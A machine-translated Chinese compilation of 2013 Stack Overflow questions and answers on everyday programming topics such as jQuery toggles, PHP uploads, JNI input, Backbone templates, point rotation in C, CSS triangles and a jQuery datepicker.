> 时间：2013-02-27T10:45:59.957
> 
> 标签：jquery, this, parent-child, parent

当用户单击“展开 [+]”时，我想在页面上折叠和展开许多 div

以下代码适用于一个 div

```
<h4 class="expanderHead" style="cursor:pointer;">Contact information <span class="expanderSign">Expand [+]</span></h4>
<div id="profile-section" style="overflow:hidden;">
some stuff
</div>

<script type="text/javascript">
jQuery(document).ready(function(){
jQuery(".expanderHead").click(function(){
    if (jQuery(".expanderSign").text() == "Expand [+]")
    {
    jQuery("#profile-section").removeClass("height-min");
    jQuery("#profile-section").addClass("height-auto");
    }
    else
    {
    jQuery("#profile-section").removeClass("height-auto");
    jQuery("#profile-section").addClass("height-min");
    }

    if (jQuery(".expanderSign").text() == "Expand [+]"){
        jQuery(".expanderSign").text("Collapse [-]");
    }
    else {
        jQuery(".expanderSign").text("Expand [+]");
    }

});
});
</script> 
```

如果我在页面上有许多 div

```
<h4 class="expanderHead" style="cursor:pointer;">Contact information <span class="expanderSign">Expand [+]</span></h4>
<div id="profile-section1" style="overflow:hidden;">
some stuff
</div>

<h4 class="expanderHead" style="cursor:pointer;">Contact information <span class="expanderSign">Expand [+]</span></h4>
<div id="profile-section2" style="overflow:hidden;">
some stuff
</div>

<h4 class="expanderHead" style="cursor:pointer;">Contact information <span class="expanderSign">Expand [+]</span></h4>
<div id="profile-section3" style="overflow:hidden;">
some stuff
</div>

etc.... 
```

我如何修改我的 jquery 以便它单独适用于所有这些 div。即它只会最小化或最大化被点击的div？

我已经使用 (this) 和 parent() 和 child() 尝试了许多不同的组合，但我似乎无法做到正确。

帮助将不胜感激:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T10:47:32.857

使用[带有 jquery 选择器的上下文](http://api.jquery.com/jQuery/)来访问当前事件源下的元素。

**语法：** *jQuery（选择器[，上下文]）*

*改变*

```
jQuery(".expanderSign").text() 
```

*到*

```
jQuery(".expanderSign", this).text() 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T10:48:27.847

您应该使用`$(this)`来定位您单击的 div。

例子：

```
$(".expanderHead").on('click', function(){
   $(this).hide();
}); 
```

在这种情况下，您将单击的 div 将消失。

用`.on()`而不用`.click()`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T10:55:58.227

您可以通过使用切换和定位下一个 div 来简化它，如下所示：

```
<h4 class="expanderHead">Contact information <span class="expanderSign" style="cursor:pointer;">[+]</span></h4>
<div class="expanderContent">some stuff</div>

$(".expanderContent").hide();
$(".expanderSign").on('click', function () {
    $(this).text($(this).text() == '[+]' ? '[-]' : '[+]');
    $(this).parent().next("div").toggle();
}); 
```

[例子](http://jsfiddle.net/USsnz/2/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-08T06:28:30.620

感谢所有的建议。最后我选择了手风琴 - [http://jqueryui.com/accordion/](http://jqueryui.com/accordion/)

不完全是我最初追求的，但它运作良好。

# php - 文件上传时延迟执行

> ID：15110103
> 
> 赞同：0
> 
> 时间：2013-02-27T10:46:21.033
> 
> 标签：php, while-loop

我的表单上传了一个文件以添加到使用 PHPMailer 创建的邮件中。

不幸的是，邮件没有被发送，我认为这可能是因为它在执行过程中发送得太早了。所以我想做的是添加一个小循环来有效地暂停进一步的执行，直到文件上传：

```
while (!move_uploaded_file($_FILES['upload'][$first_name.' CV'], $target_path))
{
    sleep(1);

    if (move_uploaded_file($_FILES['upload'][$first_name.' CV'], $target_path))
    {
        echo "The file ".  basename( $_FILES['upload'][$first_name.' CV'])." has been uploaded";
    }
    else
    {
        echo "There was an error uploading the file, please try again!";
    }
} 
```

这就是我想出的，但我不确定它在这里做什么。

请为我澄清以下内容：

1.  `!move_uploaded_file...`是否在循环开始时声明上传文件？
2.  如果是，文件是否在每次迭代中通过循环上传？
3.  `move_uploaded_file...`循环内的语句中的声明是否`if`也在上传文件，还是只是检查文件是否已上传？
4.  处理这种事情的最佳方法是什么？我确定这不是...

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T10:48:20.897

PHP 脚本在文件上传完成之前不会执行。您正在尝试解决错误的问题。

Web 服务器处理请求，包括处理和等待文件数据上传。只有在 Web 服务器收到完整的请求后，它才会调用您的 PHP 脚本。（也就是说，除非您正在使用一些不寻常的 Web 服务器。）现在保证存在的***任何***`$_FILES`内容。

 ** * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T10:49:42.287

1.  是的，无论如何它正在移动文件。一旦它移动了文件，我猜它会返回 false。
2.  是的，它试图在每次迭代时移动文件
3.  这也试图移动文件。您正在执行未声明它的方法。
4.  move_uploaded_file 是一个同步调用。只需使用下面的这段代码，如果文件上传成功，它将进入 if 语句。我猜这是你的问题的一个红鲱鱼

代码：

```
if (move_uploaded_file($_FILES['upload'][$first_name.' CV'], $target_path))
{
    echo "The file ".  basename( $_FILES['upload'][$first_name.' CV'])." has been uploaded";
}
else
{
    echo "There was an error uploading the file, please try again!";
} 
```*

# c# - C#中如何求左右子树的高度

> ID：15110110
> 
> 赞同：0
> 
> 时间：2013-02-27T10:46:33.133
> 
> 标签：c#, binary-tree, binary-search-tree, subtree

如何找到左右子树的高度，我在以下链接 [C# BST中使用了此代码](http://snipd.net/binary-search-trees-bsts-in-c)

任何帮助，将不胜感激。

亲切的问候

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:59:11.287

好吧，如果它是 BST 的正确实现，那么它们应该是平衡的。

但是为了测试它，这里有一个简单的递归实现。

```
public int TreeDepth( TreeNode<T> tree, int depth = 0 )
{
    int leftDepth = tree.Left != null 
        ? TreeDepth( tree.Left, depth + 1 ) 
        : depth;
    int rightDepth = tree.Right != null 
        ? TreeDepth( tree.Right, depth + 1 ) 
        : depth;
    return leftDepth >= rightDepth 
        ? leftDepth 
        : rightDepth;
} 
```

# android - 在android中处理uri方案

> ID：15110112
> 
> 赞同：0
> 
> 时间：2013-02-27T10:46:35.630
> 
> 标签：android, uri

我为我的应用创建了一个自定义 url 方案。

```
 <intent-filter>               
 <action android:name="android.intent.action.MAIN" />
 <category android:name="android.intent.category.LAUNCHER" />               
 </intent-filter>
 <intent-filter>
 <category android:name="android.intent.category.DEFAULT" />
 <data android:scheme="myapp" />
 <action android:name="android.intent.action.VIEW" />
 </intent-filter> 
```

现在，当我的应用程序从另一个应用程序启动时，无论哪个活动在前台，我的应用程序仅与主要活动一起启动。有没有办法确保我的应用程序以最后左状态启动？或者无论如何我会在我的应用程序启动之前收到通知？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-05T16:08:03.153

您应该使用 getIntent.getData() 然后采取相应措施。例如，如果数据具有 /home 或 /user，您可以将该视图集中在容器中。

# java - Java中通过JNI实现的非阻塞输入

> ID：15110117
> 
> 赞同：0
> 
> 时间：2013-02-27T10:46:59.557
> 
> 标签：java, c, dll, java-native-interface, getch

我正在追求使用 Java 设计一个命令外壳。我必须立即实现的一项重要功能是“自动完成”，这在按下“tab”键时由命令外壳提供便利。为此，我认为我必须在非阻塞模式下逐个字符地读取输入命令。

不幸的是，据我了解，Java API 都不支持非阻塞输入。也就是说，用于读取输入的 Java API 会等待（阻塞），直到用户点击“Enter”键，这在我的情况下是非常不可取的。另外，我已经下定决心不使用任何第三方 Java 库（如 JLine ）。

所以，我不得不求助于 JNI。本机 .C 文件似乎是这样的 -

```
 JNIEXPORT jint JNICALL Java_autoComplete_IOUtils_read_1character(JNIEnv *env, jobject obj)
{

int ch = getch(); // getch() - non-blocking input and doesn't echo the characters
return (jint)ch;
} 
```

以及调用上述本机方法的相应Java方法：

```
 public static String GetLine()
{

    int i = 0;
    do
    {
        char variable = (char) read_character(); // Native method is invoked here 

        System.out.println(variable); // Just printing it for my reference 

        cmdLine = new StringBuffer(cmdLine).insert(i, variable).toString(); // cmdLine is of type String
        i++;

    } while ((search(cmdLine.charAt(i - 1), interruptableCharacterArray)) == false);

    return (new String(cmdLine));

}

 //Checks if the entered character is any one of those keys in the interruptableCharacterArray . As of now , interruptableCharacterArray contains only '\t' (The tab key )

  private static boolean search(char charAt,char[] interruptableCharacterArray2)
{
    for (int i = 0; i < index; i++)
    {
        if (interruptableCharacterArray2[i] == charAt)
            return true;
    }
    return false;
} 
```

此外，我可以向您保证，在链接本机 .dll 方面没有任何麻烦。而且，截至目前，“InterruptableCharacterArray”仅包含“\t”（“tab”键）。因此，截至目前的 index 值为 1 。

**问题：**

1> 控件似乎没有阻塞：

```
char variable = (char) read_character(); 
```

也就是说，它似乎不允许用户在该行通过 Java 控制台输入输入，而这是打算这样做的。而且，即使在 getche() 的情况下也是同样的问题（非阻塞但回声）

相反，在每次迭代中，“变量”都会采用一些默认垃圾值，并在执行以下语句时将其打印在控制台上：

```
System.out.println(variable); 
```

但是，当 getch() 被 getc(stdin)、getchar() 等阻塞对应物替换时，我的这段代码就像一个魅力。

我无法弄清楚通过 JNI 调用 getch() 究竟是什么问题。

2> 另外，如果建议任何其他替代解决方案来实现相同的效果，我将不胜感激。

先感谢您 ！

**编辑：命令外壳将在基于 Windows 和 Unix 的操作系统上实现。**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:03:01.833

在您可以从终端获得非阻塞 IO 之前，您需要将其置于“原始”模式：终端通常收集一行输入（这样，您可以使用光标键等编辑当前行）然后发送当它“完成”时（=当用户按下回车键时）它到应用程序的标准输入。

在“原始”模式下，任何按键都会立即发送到应用程序，并且无法进行编辑（除非应用程序自己实现）。

要启用此功能，请参阅`stty(1)`. 要修改模式，您将需要 C 函数`tcsetattr(3)`。

我建议查看[JLine2 的源代码，](https://github.com/jline/jline2)即使您不想使用它，特别是[查看 UnixTerminal.java](https://github.com/jline/jline2/blob/master/src/main/java/jline/UnixTerminal.java)和[TerminalLineSettings](https://github.com/jline/jline2/blob/master/src/main/java/jline/internal/TerminalLineSettings.java)

# javascript - 模板在 Backbone.js 中不起作用

> ID：15110118
> 
> 赞同：0
> 
> 时间：2013-02-27T10:47:01.030
> 
> 标签：javascript, backbone.js

我刚开始在[Backbone.js工作](http://backbonejs.org/)

在那里，我创建了一个使用[underscore.js显示模板中值的简单示例](http://underscorejs.org/)

现在我想创建一些高级示例，使用模型事物在模板中显示用户的值

![在此处输入图像描述](../Images/cdd7ed582e40a3f4d487d5dc1488aee1.png)

现在我的模型是（EditProfileModel.js）：

```
window.EditProfileModel = Backbone.Model.extend({

constructor : function(attributes, options) {
    Backbone.Model.apply(this, arguments);
},
defaults : {
    id : '',
    firstName : '',
    lastName : '',
},
urlRoot: 'rest/editProfile'
}); 
```

EditProfileView.js：

```
window.EditProfileView = Backbone.View.extend({

template : 'tpl/EditProfileTpl.html',
el: content,

initialize:function () {
    this.render();
},

events: {

},

render:function () {
    var $this = this;

    var editProfileModel = new EditProfileModel({   
        id:this.model.get('id')
    });

    //GET editProfile/id
    editProfileModel.fetch({
        success : function(model){
            //console.log("I am fetch " + JSON.stringify(model));

            TemplateManager.get($this.template, function(template){

                console.log($(template).html());
                var html = _.template($(template).html(),{user : model});

                $this.$el.html(html);

                return $this;
            });
        }
    });
},

}); 
```

和带有路由器的 main.js 是：

```
.....
routes : {
    "profile/:id" : "editProfile"
},

editProfile : function(id){

    var $this = this;

    $this.model = new EditProfileModel({
        id:id
    });

    $('#content').html(
        new EditProfileView({
            model: $this.model
        })
    );
}

...... 
```

*TemplateManager 只是一个 javascript 代码，它按需获取模板并将其存储在数组中，如果第二次从其内存中请求，则将相同的模板发回。（我在[这里](http://lostechies.com/derickbailey/2012/02/09/asynchronously-load-html-templates-for-backbone-views/)得到了它的代码）*

但它的显示是这样的： ![在此处输入图像描述](../Images/a9762e2f8a50733022bcbf6644f93aab.png)

（请参阅从服务器返回的文本框值，它应该是**admin ）**

请帮助我，这真的很奇怪............

:(

这是来自服务器（模板）的 html:::

```
<div>
    <form id="frmEditProfile" class="form-horizontal">

        <div class="control-group">
            <label class="control-label" for="firstName">FirstName</label>
            <div class="controls">
                <input id="firstName" name="firstName" placeholder="firstName" value="&lt;%=model.get('firstName')%&gt;" autofocus="autofocus">
            </div>
        </div>
        <div class="control-group">
            <label class="control-label" for="lastName">LastName</label>
            <div class="controls">
                <input type="text" id="lastName" name="lastName" placeholder="lastName">
            </div>
        </div>
        <input type="hidden" name="id" value="">
        <div class="control-group">
            <div class="controls">
                <button class="btn btn-primary" id="btnSave" type="submit">
                    <i class="icon-ok"></i> Save
                </button>
            </div>
        </div>
    </form>
</div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T10:58:20.537

模板管理器？您是否看到在您发布的链接中，Derrick 提到这是一个坏主意？

无论如何：你记录了 $template.html()，你只需要记录模型，然后你应该能够在控制台中看到什么问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T07:03:55.970

尝试解码从您的`TemplateManager`.

```
var data = model.toJSON();
var tmpl = $("<div />").html($(template).html()).text();
var html = _.template(tmpl, {firstName: data.firstName}); 
```

还将您的模板更改为：

```
<input id="firstName" name="firstName" placeholder="firstName" 
    value="<%= firstName %>" autofocus="autofocus">... 
```

# c - 在矩形内旋转几个点

> ID：15110120
> 
> 赞同：1
> 
> 时间：2013-02-27T10:47:17.453
> 
> 标签：c, image-processing

我想编写一个 C 程序来旋转矩形内的点。

在我的程序中，矩形中心是轴心点，矩形尺寸是`320x480`. 假设矩形的其中一个顶点位于原点，则枢轴点为`(160,240)`。

现在要`(px, py)`相对于枢轴旋转矩形内的点`(ox, oy)`，我使用以下公式 -

```
p'x = cos(theta) * (px-ox) - sin(theta) * (py-oy) + ox

p'y = sin(theta) * (px-ox) + cos(theta) * (py-oy) + oy 
```

但是，当我尝试将点旋转 90 度时，所有点都映射到一条直线上。

任何人都可以解决这个问题吗？

```
theta2=90;

        theta1=abs(theta2*3.1415926)/180;

        if(theta2>0)
        {
            for(int tc=0;tc<rstruct2->nrows;tc++)
            {
                rstruct2->xcol[tc]=round((rstruct2->xcol[tc]-160)*cos(theta1)-sin(theta1)*(rstruct2->ycol[tc]-240)+160);

                rstruct2->ycol[tc]=round((rstruct2->xcol[tc]-160)*sin(theta1)+cos(theta1)*(rstruct2->ycol[tc]-240)+240);

            }
        }
        else
        {
            for(int tc=0;tc<rstruct2->nrows;tc++)
            {
                rstruct2->xcol[tc]=round(160+(rstruct2->xcol[tc]-160)*cos(theta1)+(rstruct2->ycol[tc]-240)*sin(theta1));

                rstruct2->ycol[tc]=round(240+(-rstruct2->xcol[tc]-160)*sin(theta1)+(rstruct2->ycol[tc]-240)*cos(theta1));

            }
        } 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T11:12:12.480

您的 y 旋转使用修改后的 x 值，但您需要使用基值 - 使用临时变量，如下所示：

```
double x_tmp = round((rstruct2->xcol[tc]-160)*cos(theta1)-sin(theta1)*(rstruct2->ycol[tc]-240)+160);
double y_tmp = round((rstruct2->xcol[tc]-160)*sin(theta1)+cos(theta1)*(rstruct2->ycol[tc]-240)+240);

rstruct2->xcol[tc] = x_tmp;
rstruct2->ycol[tc] = y_tmp; 
```

# vb.net - 编辑文本文件？

> ID：15110121
> 
> 赞同：0
> 
> 时间：2013-02-27T10:47:21.343
> 
> 标签：vb.net, visual-studio-2010

我有一个包含很多信息行的文本文件，我想要做的是搜索每一行，`_`一旦我找到这一行，复制下面 6 行的行并将其添加到下面的第一行和删除其他行信息。

例如：

```
_
蓝色的
X
X
X
X
10.5
X
X
X
_
橙子
X
X
X
X
15.1
X
X
X
_

```

我想显示为

```
蓝色 10.5
橙色 15.1

```

我目前正在使用 VS 2010。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T11:04:30.700

用于`IO.StreamReader`读取文件的行：

```
Dim sr As New StreamReader(sFilePath) 
```

然后循环这些行并执行您要求的操作：

```
Dim sLine, sResult As String
Dim iCont As Integer = -1

sResult = ""
sLine = sr.ReadLine()

While Not sr.EndOfStream
    If sLine.StartsWith("_"c) Then iCont = 0

    Select Case iCont
        Case 1
            sResult &= sLine & " "
        Case 6
            sResult &= sLine & Environment.NewLine()
    End Select

    If iCont >= 0 Then iCont += 1
    sLine = sr.ReadLine()
End While

sr.Close()
MessageBox.Show(sResult) 
```

**编辑：**
如果要将其写入文件，则：

```
Dim sw As New StreamWriter(sNewFilePath)

sw.Write(sResult)
sw.Close() 
```

如果您不需要其他任何东西，您也可以这样做：

```
IO.File.WriteAllText(sNewFilePath, sResult) 
```

**文档**：

*   [流阅读器](http://msdn.microsoft.com/en-us/library/system.io.streamreader.aspx)
*   [StreamWriter](http://msdn.microsoft.com/en-us/library/system.io.streamwriter%28v=vs.80%29.aspx)
*   [写所有文本](http://msdn.microsoft.com/en-us/library/ms143375.aspx)

# python - 如何将不同类型的多个值传递给不同的函数

> ID：15110128
> 
> 赞同：0
> 
> 时间：2013-02-27T10:47:36.770
> 
> 标签：python, function

我是 python 新手，所以我试图通过制作一个简单的宏量营养素计算器来练习。我不太确定如何将某些值传递给不同的函数。

这是我的代码

```
def Macro_input():
    Percent_protein = input("Percentage of Protein: ") 
    float(Percent_protein)
    Percent_carb = input("Percentage of Carbohydrates: ")
    float(Percent_carb)
    Percent_fat = input("Percentage of Fats: ")
    float(Percent_fat)
    Macro_dict = {'Protein': Percent_protein, 'Carbohydrate': Percent_carb, 'Fats': Percent_fat}
    Macro_sum = Percent_protein + Percent_carb + Percent_fat
    return Macro_sum 

def Total_macro_check(Macro_sum):

    #perhaps put all input into a dictionary? Macro['Protein':num, 'Carb':num, 'Fat':num]

    if Macro_sum == 100:
        print "You macronutrients percentages are \n Protein: "#, Macro_dict['Protein'], "%"    #list for P/C/F --> %d
    elif Macro_sum < 100:
        print "Total percentages do not add up to 100\. Please reenter percentages."
    #go back to function that asks for Macros
    elif Macro_sum > 100:
        print "Total percentages surpass 100\. Please reenter percentages."
    #go back to function that asks for Macros

def main():
    print "Please enter your macro-nutrients"
    Total_macro_value = Macro_input()

    Total_macro_check(Total_macro_value)

if __name__ == "__main__":
    main() 
```

我想要做的是输出一个字典（Macro_dict），所以如果所有宏（ ）
的总和是100，我可以打印出来。 但我也想检查是否等于100。 这意味着我必须输出一个值到功能。 `Macro_sum`
`Macro_sum`
`Macro_sum``Total_macro_check`

但是我觉得好像我的`Macro_input`函数返回了`Macro_sum`， 我不能使用它的输出，`Macro_dict`因为它返回多个值，而只接受 1 个值。
`Total_macro_check``Total_macro_check`

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T10:55:17.217

您的功能 Macro_Input 是忌。我认为这条线的行为不像你想象的那样。

```
float(Percent_protein) 
```

这是将 Percent_protein 转换为浮动是，但它没有将该值分配给任何东西。

你的功能应该是。

```
def Macro_input():
    Percent_protein = float(input("Percentage of Protein: "))
    Percent_carb = float(input("Percentage of Carbohydrates: "))
    Percent_fat = float(input("Percentage of Fats: "))
    Macro_dict = {'Protein': Percent_protein, 'Carbohydrate': Percent_carb, 'Fats': Percent_fat}
    Macro_sum = Percent_protein + Percent_carb + Percent_fat
    return (Macro_dict,Macro_sum) 
```

现在它将根据需要返回字典和总和。你可以把它们弄出来。

```
(dict,sum) = Macro_input() 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-27T10:53:06.573

修改`Macro_input()`以返回`Macro_dict`和的元组`Macro_sum`

```
def Macro_input():
    # your code
    return Macro_sum, Macro_dict 
```

然后你在你的主函数中你可以将返回的元组解压缩成两个变量，如下所示：

```
def main():
    print "Please enter your macro-nutrients"
    Total_macro_value, Macro_dict = Macro_input()

    Total_macro_check(Total_macro_value) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-27T10:57:40.943

创建一个包含值和辅助函数的类：

```
class MacroInput(object):
    def __init__(self, protein, carb, fat):
        self.protein, self.carb, self.fat = protein, carb, fat

    def sum(self):
        return self.protein + self.carb + self.fat 
```

您可以在其中创建一个实例，`Macro_input()`然后传递该实例。`def Total_macro_check(Macro_sum)`然后会变成：

```
def Total_macro_check(input):
    sum = input.sum()
    if sum == 100:
        print "You macronutrients percentages are \n Protein:", input.protein, "%"    #list for P/C/F --> %d
    ... 
```

# jquery - Mouseleave 在选项选择上无法正常工作

> ID：15110129
> 
> 赞同：1
> 
> 时间：2013-02-27T10:47:37.857
> 
> 标签：jquery, mouseleave

我有一个选项选择如下

```
<select class="myselect">
  <option value="volvo">Volvo</option>
  <option value="saab">Saab</option>
  <option value="vw">VW</option>
  <option value="audi" selected>Audi</option>
</select> 
```

用于鼠标离开的 Jquery

```
$('.myselect').live('mouseleave',function(){
    alert('Sample');
}); 
```

但我无法选择下拉列表的值

# wpf - 在 wpf listview 中添加组合项

> ID：15110131
> 
> 赞同：0
> 
> 时间：2013-02-27T10:47:45.310
> 
> 标签：wpf, listview, combobox

我的 wpf 屏幕左侧有一个列表视图。单击时，它应该导航到应用程序的其他部分。现在我想在单击列表视图项时水平显示级联菜单（即向右）。我怎样才能以编程方式做到这一点？我尝试将组合框放在列表视图项目选定事件中，但它仍然不起作用。我也试过comboboxitem。但似乎有死胡同

首页 班级学生 费用结构 已支付费用的学生名单 未缴费用的学生名单 @Blachshma

# oauth-2.0 - Yahoo Contacts 导出 PHP SDK

> ID：15110133
> 
> 赞同：0
> 
> 时间：2013-02-27T10:47:48.387
> 
> 标签：oauth-2.0, yahoo, yql, yahoo-api, yahoo-oauth

您好我正在使用 yahoo php sdk 导出联系人。

如文档中所述，我正在更改 common.inc.php 中的所有 api 相关详细信息

但是，当我转到任何示例时，它只会给出一个空白页。

有什么帮助吗？

我已经从这里下载了 sdk：http: [//developer.yahoo.com/social/sdk/#php](http://developer.yahoo.com/social/sdk/#php)

问候，

寿司

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-10T04:32:57.743

如果您在 localhost 中运行上述代码，则它将无法正常工作，并且会显示空白页。

因此，为此在您的开发或测试服务器中执行代码，它将执行得很好。

# jquery - 如何让人们在 rails 中选择 TextArea 字段（来自多个文本区域字段）？

> ID：15110134
> 
> 赞同：0
> 
> 时间：2013-02-27T10:47:49.353
> 
> 标签：jquery, ruby-on-rails, ruby-on-rails-3

所以我只有一个文本字段 BODY 填充了预内容 First Value

```
<%= f.input :body, :input_html  => { :value => "First Value" } %> 
```

现在我想为用户提供从多个文本区域复选框中选择一个文本区域的选项，我该怎么做？请参阅图片[http://i.imgur.com/Xy4LVko.png](http://i.imgur.com/Xy4LVko.png)以获得更好的说明

我假设会涉及到一些 jQuery

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:49:57.667

是的，你是对的，你将不得不使用一些 jquery。考虑您的复选框 id 是“checkbox_1”，而 textarea id 是“textarea_1”，那么您可以按如下方式进行：

```
$(document).ready(function(e){
  $("#checkbox_1").click(function(e) {
    $("#textarea_1").focus();
  });
}); 
```

如果需要，您还可以检查复选框的值。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T13:38:54.337

我们可以像这样对复选框和相应的输入进行分组

```
<% form_for @object do |f| %>
    <div class="optional-input">
        <%= check_box_tag :attribute1 %>
        <%= f.text_area :attribute, :class => "display: none;" %>
    </div>
    <div class"optional-input">
        <%= check_box_tag :attribute2 %>
        <%= f.text_area :attribute2, :class => "display: none;" %>
    </div>
    ................
    ................ 
```

现在，如果我们有复选框元素，我们可以访问相应的文本区域，因为它们是同级的。然后我们可以将 on-change 事件处理程序绑定到每个复选框，它是 div 元素的子元素。

```
$(document).ready(function(){
    $('.optional-input').find(':checkbox').change(function(){
        if($(this).is('checked')){
            $(this).siblings('textarea').show()
        }
        else{
            $(this).siblings('textarea').hide()
        }       
    })
}) 
```

我希望它会工作

# python - GAE：加载大量大文件python时超出软限制

> ID：15110135
> 
> 赞同：0
> 
> 时间：2013-02-27T10:47:55.500
> 
> 标签：python, google-app-engine

我对 GAE 和 python 有疑问：

我已经超越了我的大学的一个调查工具，它可以完成一些任务——其中一个是它跟踪鼠标光标的移动。

调查完成后，数据将被提交给将其存储在 blobstore 中的控制器，因为如果超出配额，结果可能会略大于 1 MB。

现在，我需要将它导出到一个 excel 文件中，并且我想使用 XLWT。我尝试通过任务队列使用它，该队列被执行。

在小型数据集上，一切都很好。但大约之后。10-12 个数据集我达到了内存软限制。我已经尝试运行垃圾收集任务等，以便清除内存。

有没有可能结合所有数据（大约 300*~1.5 MB）并将其作为 excel 文件提供？

我已经打开了一个流以在 blobstore 中写入 excel 文件，但错误仍然存​​在。

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T19:04:25.227

我建议阅读[Python Excel 教程](http://www.simplistix.co.uk/presentations/python-excel.pdf)。另见页面[http://www.python-excel.org/](http://www.python-excel.org/)。他们建议在工作表上调用flush_row_data。

无论如何，使用 F1 实例很可能无法组合 300 个（1.5Mb）文件，因为内存为 128MB，XLWT 将临时数据保存在临时文件中，而 GAE 中的只是一个 StringIO 对象。

考虑为此使用动态后端并使用 B4_1G 实例。

此外，是否有任何理由不生成 CSV。

# html - CSS 三角形边框

> ID：15110137
> 
> 赞同：1
> 
> 时间：2013-02-27T10:47:58.677
> 
> 标签：html, css, css-shapes

我正在尝试使用 CSS 创建标签形状。使用以下代码，我可以使用左侧的箭头正确显示标签，如何将箭头移动到 div 的右侧而不是左侧？

HTML：

```
<div class="tags">
    <a href="#">tag</a>
</div> 
```

CSS：

```
.tags a{
    float:left;
    height:24px;
    line-height:24px;
    position:relative;
    font-size:11px;     
    margin-left:20px;
    padding:0 10px 0 12px;
    background:#0089e0;
    color:#fff;
    text-decoration:none;
} 

.tags a:before{
    content:"";
    float:left;
    position:absolute;
    top:0;
    left:-12px;
    width:0;
    height:0;
    border-color:transparent #0089e0 transparent transparent;
    border-style:solid;
    border-width:12px 12px 12px 0;      
} 
```

演示：http: [//jsfiddle.net/TXLBT/](http://jsfiddle.net/TXLBT/)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-27T10:50:42.893

只需更改一些 CSS 样式：

```
.tags a:after{
    content:"";
    float:left;
    position:absolute;
    top:0;
    right:-12px; //Change here
    width:0;
    height:0;
    border-color:transparent transparent transparent #0089e0; //Change here
    border-style:solid;
    border-width:12px 0 12px 12px; //Change here
} 
```

它相当不言自明：它现在从左右边界属性定位到交换。（当然除了`border-style`）

仅供参考：如果绝对定位元素，则浮动元素对其没有影响。

[JSFiddle](http://jsfiddle.net/TXLBT/2/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-27T10:54:21.923

[在这里分叉你的代码](http://jsfiddle.net/barney/pYy6L/)。

本质上，您需要更改`left`for的实例`right`（无论是`::before`还是`::after`，`float`方向都是无关紧要的，因为伪元素是绝对定位的）。执行此操作时，请记住`border-color`并`border-style`实际按该顺序引用顶部、右侧、底部和左侧。

因此，您要更改的属性是：

```
left:-12px;
border-color:transparent #0089e0 transparent transparent;
border-width:12px 12px 12px 0; 
```

到

```
right:-12px;
border-color:transparent transparent transparent #0089e0;
border-width:12px 0 12px 12px; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-27T10:52:17.743

将 :before 定位到右侧，并将边框设置为除了左侧而不是右侧之外的所有边都是透明的。

# jquery - 在 jquery datapicker 中只提供当前月份的半月日期

> ID：15110142
> 
> 赞同：1
> 
> 时间：2013-02-27T10:48:11.260
> 
> 标签：jquery, jquery-ui-datepicker

只有任何月份的日期 1 和 16 可供选择。应禁用所有其他日期。请帮忙

```
$(closure.el).find('#listcmd_invoices .add .invoice-from-date-input')
             .datepicker({
                changeYear: true,
                showAnim: 'slide',
                changeMonth : true,
                yearRange : "Y:+2Y",
                beforeShowDay: function(date){
                        return [date.getDate() == 16 && date.getDate() == 1,""]
                    }
             }); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T10:59:39.317

假设 JQuery-UI datpicker，因为这就是您标记问题的内容，那么您在初始化 datepicker 时应该提供的选项是[beforeShowDay](http://api.jqueryui.com/datepicker/#option-beforeShowDay)。该文档对必须从该方法返回的内容提供了相当好的描述，为清楚起见，转载如下：

> 函数将日期作为参数，并且必须返回一个数组，其中 [0] 等于 true/false 指示此日期是否可选，[1] 等于 CSS 类名称或默认表示为 ""，并且 [ 2] 此日期的可选弹出工具提示。在显示之前，它会在日期选择器中的每一天被调用。

所以对你来说，像：

```
$( "#datepicker" ).datepicker({
  beforeShowDay: function(date){
    return [
      date.getDate() == 16 || date.getDate() == 1,
      ""
    ];
  }
}); 
```

（刚刚看到你的代码更新。你遇到的唯一问题是你的测试是“天等于 1 天等于 16”.. 显然两者都不是真的。所以你错的只是你应该使用 OR！）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T12:13:54.707

```
$(closure.el).find('#listcmd_invoices .add .invoice-from-date-input')
         .datepicker({
            changeYear: true,
            showAnim: 'slide',
            changeMonth : true,
            yearRange : "Y:+2Y",
            beforeShowDay: function(date){
                               **if (date.getDate() == 1 || date.getDate() == 16)
                                   return [true,""];
                               else
                                   return [false,""];**
                            }
}); 
```

# xml - 数字签名前缀问题

> ID：15110143
> 
> 赞同：1
> 
> 时间：2013-02-27T10:48:12.523
> 
> 标签：xml, web-services, security

我面临一个问题，无法弄清楚我错过了什么。我正在用 c# 计算数字签名，无法获得正确的签名值。有人知道签名前缀是否可以更改签名值吗？我的网络服务想要一个“ds”前缀，我在代码中所做的是计算签名，然后添加前缀。这可能是问题吗？我的摘要值是正确的，但签名值不同。是否需要先设置前缀，然后再计算签名？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-07-06T00:56:20.390

